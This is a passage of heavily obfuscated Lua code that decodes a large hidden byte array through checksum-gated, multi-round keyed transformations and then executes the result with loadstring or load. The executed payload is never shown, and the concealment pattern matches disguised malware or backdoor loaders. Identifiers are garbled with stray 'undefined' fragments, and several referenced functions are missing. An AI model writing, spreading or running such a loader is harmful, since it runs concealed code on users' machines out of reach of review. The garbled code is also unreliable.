199,7,255,111,83,113,10,10,105,117,158,168,151,241,38,17,89,116,215,76,36,125,72,5,212,126,84,23,83,128,43,205,18,195,255,111,83,113,10,10,101,130,196,172,133,234,38,254,58,29,251,124,228,215,185,37,88,17,184,185,83,128,43,205,18,195,255,111,223,205,67,200,165,32,190,145,124,168,138,247,254,235,250,85,70,198,130,165,51,155,84,185,83,128,43,205,18,195,255,111,83,113,10,109,184,202,190,81,151,131,38,47,173,171,205,226,232,184,185,71,88,17,184,185,83,128,43,205,18,195,255,111,83,113,10,97,152,181,196,142,112,18,190,43,232,106,246,11,232,125,64,71,88,17,184,185,83,128,231,121,18,106,50,96,162,161,67,13,105,6,100,248,148,214,232,202,226,230,246,11,232,125,64,71,88,17,184,185,83,128,43,137,207,195,191,4,159,188,231,22,105,211,89,169,24,162,61,42,226,165,156,95,210,225,185,71,88,17,184,185,83,128,43,205,18,195,255,111,83,113,10,238,152,181,181,249,153,120,56,17,233,116,243,172,72,216,4,2,230,193,64,38,9,128,43,205,18,195,255,111,83,113,10,10,105,117,78,54,151,110,235,194,254,41,125,234,158,18,169,189,72,238,164,81,193,132,126,28,18,195,255,111,83,113,10,10,105,117,78,54,151,191,61,202,47,164,246,7,179,175,140,71,30,23,244,24,198,255,43,205,18,195,255,111,83,113,10,10,105,117,78,54,151,191,85,147,111,146,78,174,48,246,72,119,145,193,76,213,142,245,239,228,214,231,94,100,83,113,10,10,105,117,78,54,151,191,61,202,226,230,246,11,179,81,45,171,16,69,36,214,202,221,95,28,199,195,255,111,83,113,10,10,105,117,78,54,151,240,11,52,232,230,246,11,232,125,64,71,88,5,86,155,9,128,43,205,18,111,42,179,31,244,135,205,191,25}}

local _CXundefinedMundefinedbundefinedH={}
local _ym8Q=0
for _rmRX=0,7558 do
  _ym8Q=_ym8Q+1
  local __ci=(_rmRX%1)+1
  local __co=math.floor(_rmRX/1)+1
  local __v=_trRY0b[__ci][__co]
  __v=_hSMundefinedMi[__v+1]
  _CXundefinedMundefinedbundefinedH[_ym8Q]=__v
end
local _rjfNfz=(12*183)%256

local _hfsSaR=0
for _rmRX=1,#_CXundefinedMundefinedbundefinedH do _hfsSaR=(_hfsSaR+_CXundefinedMundefinedbundefinedH[_rmRX])%256 end
if _hfsSaR~=70 then return end
local _QUAdundefinedb1ts={{213,193,80,47,38,153,88,136,12,23,174,102,87,218,180,32,126,188,29,145,6,246,198,186,105,253,244,211,166,192,11,24},{34,246,83,238,213,196,56,222,183,136,224,148,80,201,50,159,113,45,156,191,113,255,164,67,132,80,245,121,252,255,160,29},{134,73,66,110,241,179,120,95,43,3,151,85,247,225,140,219,233,163,176,64,173,14,58,23,211,246,143,12,80,40,113,165},{18,240,65,118,134,151,47,240,67,217,119,16,132,114,92,105,110,240,160,114,22,164,108,195,110,107,45,181,90,170,69,43}}
local _Rea2={6,3,7,1}
local _vrozmS=48~=145 and 48 or 145
local _Onaceundefined={
  [1]=function(v,k,r) return _feundefinedundefinedL0h(v,r) end,
  [2]=function(v,k,r) return _pgxvW1b(v,k) end
}
for __l=#_QUAdundefinedb1ts,1,-1 do
  local k=_QUAdundefinedb1ts[__l]
  local r=_Rea2[__l]
  for _rmRX=1,#_CXundefinedMundefinedbundefinedH do
    local v=_CXundefinedMundefinedbundefinedH[_rmRX]
    v=_Onaceundefined[2](v, k[((_rmRX-1)%#k)+1], r)
    v=_Onaceundefined[1](v, k[((_rmRX-1)%#k)+1], r)
    _CXundefinedMundefinedbundefinedH[_rmRX]=v
  end
end

local _sfF4f={}
for _rmRX=1,#_CXundefinedMundefinedbundefinedH do _sfF4f[_rmRX]=string.char(_CXundefinedMundefinedbundefinedH[_rmRX]) end
if (245+108)%2==2 then local _mundefinedSje0=245 end
local ok,exec=pcall(function() return (loadstring or load)(table.concat(_sfF4f)) end)
if ok and exec then return exec() end
